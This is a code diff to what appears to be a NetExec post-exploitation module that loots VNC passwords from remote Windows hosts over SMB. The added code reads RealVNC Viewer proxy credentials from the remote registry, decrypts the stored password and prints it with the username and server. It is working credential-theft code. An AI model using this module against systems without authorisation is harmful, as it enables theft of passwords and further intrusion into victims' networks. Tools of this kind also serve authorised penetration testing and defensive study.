@@ -17,7 +17,7 @@ class NXCModule:
     """
 
     name = "vnc"
-    description = "Loot VNC Passwords"
+    description = "Loot Passwords from VNC server and client configurations"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -141,6 +141,31 @@ class NXCModule:
                 continue
             self.context.log.highlight(f"[{vnc_name}] Password: {password.decode('latin-1')}")
 
+        vnc_users = (
+            ("RealVNC Viewer 7.x", "HKCU\\Software\\RealVNC\\vncviewer", "ProxyUserName", "ProxyPassword", "ProxyServer"),
+        )
+        for vnc_name, path, user, password, server in vnc_users:
+            cred = {}
+            try:
+                value = self.reg_query_value(remote_ops, path, password).encode().rstrip(b"\x00").decode()
+                value = unhexlify(value)
+            except Exception as e:
+                print(e)
+                if "ERROR_FILE_NOT_FOUND" not in str(e):
+                    self.context.log.debug(f"Error while RegQueryValue {path}\\{user}: {e}")
+                continue
+            if value is None:
+                continue
+            cred["password"] = self.recover_vncpassword(value).decode()
+            try:
+                cred["server"] = self.reg_query_value(remote_ops, path, server)
+                cred["user"] = self.reg_query_value(remote_ops, path, user)
+            except Exception as e:
+                if "ERROR_FILE_NOT_FOUND" not in str(e):
+                    self.context.log.debug(f"Error while RegQueryValue {path}\\{user}: {e}")
+                continue
+            self.context.log.highlight(f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}")
+
     def split_len(self, seq, length):
         return [seq[i:i + length] for i in range(0, len(seq), length)]
 
@@ -184,7 +209,7 @@ class NXCModule:
             file_content = dploot_conn.readFile(self.share, file)
             if file_content is not None:
                 regex_passwd = [rb"passwd=[0-9A-F]+", rb"passwd2=[0-9A-F]+"]
-                for regex in regex_passwd:                
+                for regex in regex_passwd:
                     passwds_encrypted = re.findall(regex, file_content)
                     for passwd_encrypted in passwds_encrypted:
                         passwd_encrypted = passwd_encrypted.split(b"=")[-1]
